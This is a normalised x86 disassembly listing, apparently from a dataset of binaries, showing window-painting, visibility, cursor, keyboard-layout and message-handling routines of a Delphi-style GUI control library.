mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_444820
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
call sub_432b54
mov edi eax
mov eax edi
call sub_432c34
test al al
je r-xdata
cmp [ ebx + 0x1f8 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x170 ]
call sub_42222c
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov eax [ esi + 0x4 ]
cmp eax [ esi + 0x8 ]
jne r-xdata
test [ ebx + 0x52 ] 0x4
je r-xdata
mov [ esi + 0xc ] 0x1
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_446450
mov edx eax
mov ecx [ esi + 0x4 ]
mov eax edi
call sub_432dcc
jmp r-xdata
sub_4448a8
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
cmp [ edi + 0x1a5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x50 ] 0x10
je r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x2
jne r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x8
je r-xdata
mov [ esp ] al
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0x1
jne r-xdata
mov al 0x1
mov bl 0x1
xor eax eax
jmp r-xdata
mov eax [ edi + 0x180 ]
push eax
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x1 ] al
test bl bl
je r-xdata
mov al 0x1
test [ edi + 0x55 ] 0x2
jne r-xdata
mov al [ esp ]
or al [ esp + 0x1 ]
je r-xdata
mov edx esi
mov eax edi
call sub_4416cc
test bl bl
je r-xdata
mov eax edi
call sub_446760
mov eax edi
call sub_446358
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
or al [ esp + 0x1 ]
jne r-xdata
mov eax edi
call sub_446358
mov eax [ esi + 0x8 ]
test [ eax + 0x18 ] 0xc0
je r-xdata
sub_444968
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
pop ebx
retn
mov esi [ edi + 0x8 ]
test [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esi + 0x14 ]
lea edx [ esi + 0x10 ]
mov eax ebx
call sub_441328
test al al
jne r-xdata
or [ esi + 0x18 ] 0x1
sub_4449b8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_446760
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax ebx
call sub_442c8c
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffcf
call sub_403368
sub_444a00
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x180 ]
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov ax [ esi + 0x8 ]
sub ax 0xfffe
je r-xdata
cmp [ esi + 0xa ] 0x201
jne r-xdata
sub ax 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov di [ eax + 0x44 ]
test di di
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call GetLastActivePopup
mov edi eax
call GetForegroundWindow
cmp edi eax
je r-xdata
test di di
je r-xdata
push esp
call GetCursorPos
push 0x0
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_43f6f4
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_443cb8
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45fe8c
jmp r-xdata
movsx edx di
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e374
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
jmp r-xdata
test di di
jne r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov di [ eax + 0x78 ]
mov di 0xfffe
jmp r-xdata
mov di [ ebx + 0x78 ]
mov di 0xfffe
jmp r-xdata
sub_444b50
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_446450
call sub_44b18c
mov edi eax
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov [ ebp - 0x24 ] 0x2
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x1c ] eax
lea edx [ ebp - 0x24 ]
mov eax edi
call sub_44b1b8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
call sub_446450
mov edx edi
call sub_44b1a0
mov bl 0x1
lea eax [ ebp - 0x60 ]
push eax
push 0x3c
mov eax [ ebp - 0x4 ]
call sub_421a20
push eax
call GetObjectA
lea edx [ ebp - 0x60 ]
mov eax edi
call sub_44b1d0
sub_444bd4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_444cb3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444cba
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
mov eax ebx
call sub_446450
mov dl [ ebx + 0x184 ]
call sub_44b0b0
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e2ec
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_4080b0
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e0ec
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ eax + 0x3c ]
cmp [ ebx + 0x184 ] 0x0
je r-xdata
push 0x1
push esi
call ActivateKeyboardLayout
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e0ec
mov edx [ ebx + 0x188 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edi eax
test edi edi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e0ec
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
sub_444cc0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_444d4a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444d51
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
cmp [ ebx + 0x188 ] 0x0
je r-xdata
cmp [ ebx + 0x184 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e2ec
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x188 ]
call sub_4080b0
test eax eax
je r-xdata
mov eax ebx
call sub_446450
mov dl 0x1
call sub_44b094
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
call ActivateKeyboardLayout
sub_444dac
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dx [ ebp + 0x8 ]
mov eax edi
call sub_416a50
push eax
mov ecx esi
mov edx 0xb038
mov eax ebx
call sub_440d98
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp [ ebx + 0x1b2 ] 0x0
je r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1b4 ]
call [ ebx + 0x1b0 ]
sub_444dfc
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1ba ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0xc
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x1bc ]
call [ ebx + 0x1b8 ]
sub_444e30
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
mov si 0xffd2
call sub_403368
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
mov si 0xffc3
call sub_403368
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_444e70
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov [ esp ] 0x1
cmp [ ebx + 0x1f2 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esi
lea eax [ esp + 0x4 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
xor eax eax
jmp r-xdata
push edi
mov ecx esi
mov edx 0xb039
mov eax ebx
call sub_440d98
test eax eax
je r-xdata
mov [ esp ] al
mov al [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_444ec8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_41ebe0
mov edx [ r-xdata ]
call sub_40331c
mov [ edi ] eax
pop edi
pop esi
pop ebx
retn
sub_444f00
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x178 ]
test esi esi
je r-xdata
xor eax eax
mov edx edi
mov eax esi
call sub_417e94
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_444f24
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov edi edx
mov ebx eax
push esi
mov eax ebx
call sub_446450
push eax
call GetWindowRect
push 0xa
push 0xa
push esi
call InflateRect
cmp [ ebx + 0x1d2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
push esi
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x1d4 ]
call [ ebx + 0x1d0 ]
sub_444f80
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_444eec
mov edi eax
test edi edi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov ebx edi
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_417e94
cmp [ eax + 0x57 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec edi
sub_444fc0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x17c ]
call sub_4058e8
cmp [ ebx + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x1a7 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x24 ]
mov edx eax
test edx edx
je r-xdata
mov [ ebx + 0x1f8 ] al
pop esi
pop ebx
retn
mov eax esi
call sub_4058e8
jmp r-xdata
sub edx 0xffffff8c
cmp [ ebx + 0x1f8 ] 0x0
jne r-xdata
sub_44502c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_4450d4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ edi + 0x1a8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4450db
lea eax [ ebp - 0x4 ]
call sub_4058d0
retn
mov [ edi + 0x1a8 ] bl
test [ edi + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax edi
call sub_43d85c
test bl bl
jne r-xdata
cmp [ edi + 0x178 ] 0x0
jne r-xdata
mov eax [ edi + 0x178 ]
call sub_40316c
xor eax eax
mov [ edi + 0x178 ] eax
lea eax [ edi + 0x17c ]
call sub_4058d0
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc6
call sub_403368
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x17c ]
call sub_4058e8
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ edi + 0x178 ] eax
sub_4450e4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_446450
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
call sub_442c64
xor edx edx
push ebp
push sub_4451a6
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov si 0xffcc
call sub_403368
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4451ad
mov eax [ ebp - 0x4 ]
call sub_442c6c
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x58 ]
push edx
mov edx [ ebp - 0x8 ]
mov cl [ eax + 0x54 ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_4451ad
mov eax [ ebp - 0x4 ]
call sub_457570
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_43fe10
sub_4451f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4030b4
cmp esi eax
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_441a58
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x57 ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_445262
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
lea ecx [ eax + 0x44 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov si 0xffcc
call sub_403368
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_43fe10
sub_44527c
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1da ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1dc ]
call [ ebx + 0x1d8 ]
sub_4452a4
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_457570
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_457478
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbc
call sub_403368
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_4452a4
test al al
jne r-xdata
sub_44530c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4452a4
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_447578
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_445338
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4452a4
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_447578
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_445364
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1ea ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
sub_44538c
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_457570
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_457478
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbb
call sub_403368
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_44538c
test al al
jne r-xdata
sub_4453f4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44538c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_445414
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44538c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_445454
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_457570
mov ebp eax
test ebp ebp
je r-xdata
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
mov al [ edi + 0x4 ]
mov [ esp ] al
mov edx esp
mov eax esi
mov si 0xffba
call sub_403368
xor eax eax
mov al [ esp ]
mov [ edi + 0x4 ] ax
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_445454
test al al
jne r-xdata
sub_4454b8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_445454
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4454d8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4430fc
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4430c0
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x52 ] 0x1
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_440d98
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_4454d8
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_445588
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax ebx
call sub_4454d8
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp ebx [ eax + 0x44 ]
je r-xdata
mov eax ebx
call sub_457570
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax esi
call sub_440d98
test eax eax
jne r-xdata
sub_445630
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44404c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_445650
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov si [ ebx + 0x4 ]
cmp si 0x1
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44404c
test al al
jne r-xdata
cmp si 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_445684
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44404c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4456a4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
pop esi
retn
sub_4456f4
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ edx + 0xc ] 0x1
pop esi
retn
sub_445718
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebp eax
mov dl [ esp ]
mov eax ebp
call sub_43ee7c
mov ebx eax
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4430fc
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
test [ esp ] bl
jne r-xdata
mov edx edi
mov eax ebp
call sub_4430c0
mov dl [ esp ]
mov si 0xffd1
call sub_403368
or bl al
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_445770
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or [ ebx + 0x54 ] 0x4
mov dl 0x1
mov eax ebx
mov si 0xffd1
call sub_403368
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_445794
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor edx edx
mov eax ebx
mov si 0xffd1
call sub_403368
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_4457cc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44186c
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov dx 0xb03d
mov eax ebx
call sub_44315c
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_44396c
sub_445804
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax ebx
mov si 0xffc2
call sub_403368
pop esi
pop ebx
retn
mov eax ebx
call sub_4401f4
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
call sub_404400
push eax
call LoadKeyboardLayoutA
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x38 ]
call sub_404400
push eax
call LoadKeyboardLayoutA
jmp r-xdata
sub_445884
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_443d4c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_441940
sub_4458e4
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_443ac0
test [ ebx + 0x51 ] 0x4
je r-xdata
xor edx edx
mov eax ebx
call sub_442ebc
pop ebx
retn
sub_445914
xor edx edx
mov dl [ eax + 0x1a6 ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
retn
sub_44593c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_446754
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_442ebc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x180 ]
push eax
call EnableWindow
sub_4459ac
push ebx
mov ebx eax
mov eax ebx
call sub_4417ac
mov eax ebx
call sub_446754
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_44315c
pop ebx
retn
push 0x0
mov eax [ ebx + 0x68 ]
call sub_421a20
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_440d98
sub_4459e8
push ebx
add esp 0xfffffff8
mov ebx eax
call GetCapture
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
push esp
call GetCursorPos
mov eax esp
xor edx edx
call sub_43e45c
cmp ebx eax
jne r-xdata
push 0x1
mov eax ebx
call sub_446450
mov ecx eax
mov edx 0x20
mov eax ebx
call sub_440d98
sub_445a28
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_446754
test al al
je r-xdata
pop esi
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_446450
push eax
call SetWindowPos
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_445a68
push ebx
mov ebx eax
test [ ebx + 0x50 ] 0x10
je r-xdata
mov dx 0xb011
mov eax ebx
call sub_44315c
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_446754
test al al
je r-xdata
